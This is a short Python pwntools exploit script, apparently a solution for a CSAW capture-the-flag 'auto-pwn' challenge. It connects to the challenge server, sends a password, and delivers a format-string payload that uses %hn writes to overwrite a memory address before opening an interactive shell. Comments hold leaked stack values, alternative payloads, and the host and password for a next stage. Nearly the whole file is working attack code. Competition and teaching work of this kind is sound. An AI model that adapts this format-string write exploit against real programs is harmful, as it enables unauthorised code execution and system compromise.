from pwn import *
ex = 0x804E028
h,p = 'auto-pwn.chal.csaw.io', 11001
sh = remote(h,p)
filename = './raw_binary'
# sh = process(filename)
pas = "cd80d3cd8a479a18bbc9652f3631c61c"
elf = ELF(filename)
#libc = elf.libc
# gdb.attach("raw_binary")
# sh = gdb.debug(filename) # type: pwnlib.tubes.process.process
# sh = remote('127.0.0.1', 7777)
# 0x960xf7f635a00x804a0fb0x8869008.0x702501550x2e70252e.0x252e7025.0x70252e70.0x252e7025.0x70252e700x2e70252e.0x70257025.0x2e70252e.0x252e7025.0x70252e70
# AAAAAA0x960xf7f855a00x804a0fb0x88d40080x414101550x41414141.0x252e7025.0x70252e70.0x2e70252e
# parameter 6
w,n = 0x0804, 0x9f99
exp = "AA"+p32(ex+2)+p32(ex)+"%"+ str(w-10) +"c%6$hn%"+ str(n-w) +"c%7$hn"
# exp = "AA"+p32(ex) + "%" + str(0x08049f99-10) + "c%6$n"
# exp = "AAAAAA%6$p"
print exp
sh.sendline(pas)
sh.recvuntil("will generate a report!!")
sh.sendline(exp)
sh.interactive()

# Sorry, but your flag is in another box! 
# nc auto-pwn.chal.csaw.io 11002 
# and use password 
# 4a47f4618ce3e7b567cce92b48f41e61


# 08049E70